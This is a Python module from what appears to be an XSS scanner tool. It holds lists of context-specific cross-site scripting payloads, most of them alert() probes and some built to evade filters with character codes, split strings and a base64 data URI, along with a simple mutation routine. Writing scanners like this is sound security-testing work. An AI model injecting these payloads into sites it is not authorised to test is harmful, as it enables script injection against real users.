"""
Payload Generator - Context-aware XSS payloads.

Generates and mutates payloads based on injection context.
"""

from typing import List, Set
from enum import Enum
from xsscan.core.models import InjectionContext


class PayloadGenerator:
    """Generates context-aware XSS payloads."""
    
    # Base payloads for different contexts
    HTML_BODY_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<div onmouseover=alert('XSS')>test</div>",
        "<svg/onload=alert('XSS')>",
        "<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        "<script>Function('ale'+'rt')('XSS')</script>",
        "<script>setTimeout('alert(1)',0)</script>",
    ]
    
    HTML_ATTRIBUTE_PAYLOADS = [
        "' onmouseover='alert(1)' '",
        '" onmouseover="alert(1)" "',
        "' onclick='alert(1)' '",
        '" onclick="alert(1)" "',
        "' onfocus='alert(1)' autofocus '",
        '" onfocus="alert(1)" autofocus "',
        "'><script>alert('XSS')</script>",
        '"><script>alert("XSS")</script>',
        "' onerror='alert(1)' '",
        '" onerror="alert(1)" "',
        "javascript:alert('XSS')",
        "javascript:alert(String.fromCharCode(88,83,83))",
        "onclick=alert('XSS')",
        "onmouseover=alert('XSS')",
        "onerror=alert('XSS')",
        "onload=alert('XSS')",
    ]
    
    JAVASCRIPT_PAYLOADS = [
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "';alert(String.fromCharCode(88,83,83));//",
        "\";alert(String.fromCharCode(88,83,83));//",
        "';eval('alert(1)');//",
        "\";eval('alert(1)');//",
        "';Function('ale'+'rt')('XSS');//",
        "\";Function('ale'+'rt')('XSS');//",
        "';setTimeout('alert(1)',0);//",
        "\";setTimeout('alert(1)',0);//",
        "';new Function('alert(1)')();//",
        "\";new Function('alert(1)')();//",
        "';[]['constructor']['constructor']('alert(1)')();//",
        "\";[]['constructor']['constructor']('alert(1)')();//",
    ]
    
    URL_PAYLOADS = [
        "javascript:alert('XSS')",
        "javascript:alert(String.fromCharCode(88,83,83))",
        "javascript:eval('alert(1)')",
        "javascript:Function('ale'+'rt')('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
    ]
    
    CSS_PAYLOADS = [
        "expression(alert('XSS'))",
        "expression(alert(String.fromCharCode(88,83,83)))",
        "javascript:alert('XSS')",
        "url('javascript:alert(\"XSS\")')",
    ]
    
    def __init__(self):
        """Initialize the payload generator."""
        self._used_payloads: Set[str] = set()
    
    def get_payloads(self, context: InjectionContext, count: int = None) -> List[str]:
        """
        Get payloads for a specific context.
        
        Args:
            context: The injection context
            count: Maximum number of payloads to return (None for all)
        
        Returns:
            List of payload strings
        """
        if context == InjectionContext.HTML_BODY:
            payloads = self.HTML_BODY_PAYLOADS.copy()
        elif context == InjectionContext.HTML_ATTRIBUTE:
            payloads = self.HTML_ATTRIBUTE_PAYLOADS.copy()
        elif context == InjectionContext.JAVASCRIPT:
            payloads = self.JAVASCRIPT_PAYLOADS.copy()
        elif context == InjectionContext.URL:
            payloads = self.URL_PAYLOADS.copy()
        elif context == InjectionContext.CSS:
            payloads = self.CSS_PAYLOADS.copy()
        else:
            payloads = self.HTML_BODY_PAYLOADS.copy()
        
        if count is not None:
            payloads = payloads[:count]
        
        return payloads
    
    def mutate_payload(self, payload: str, context: InjectionContext) -> List[str]:
        """
        Generate mutations of a base payload.
        
        Args:
            payload: Base payload to mutate
            context: Injection context
        
        Returns:
            List of mutated payloads
        """
        mutations = [payload]
        
        # Case variations
        mutations.append(payload.upper())
        mutations.append(payload.lower())
        mutations.append(payload.capitalize())
        
        # Encoding variations
        if context == InjectionContext.HTML_BODY:
            # HTML entity encoding
            mutations.append(payload.replace("<", "&lt;").replace(">", "&gt;"))
            # Unicode encoding
            mutations.append(payload.encode("unicode_escape").decode("ascii"))
        
        # String concatenation
        if "alert" in payload:
            mutations.append(payload.replace("alert", "ale" + "rt"))
        
        # Remove duplicates
        return list(set(mutations))
    
    def get_all_payloads(self) -> List[str]:
        """Get all available payloads across all contexts."""
        all_payloads = []
        for context in InjectionContext:
            all_payloads.extend(self.get_payloads(context))
        return list(set(all_payloads))
    
    def reset(self):
        """Reset the used payloads tracker."""
        self._used_payloads.clear()

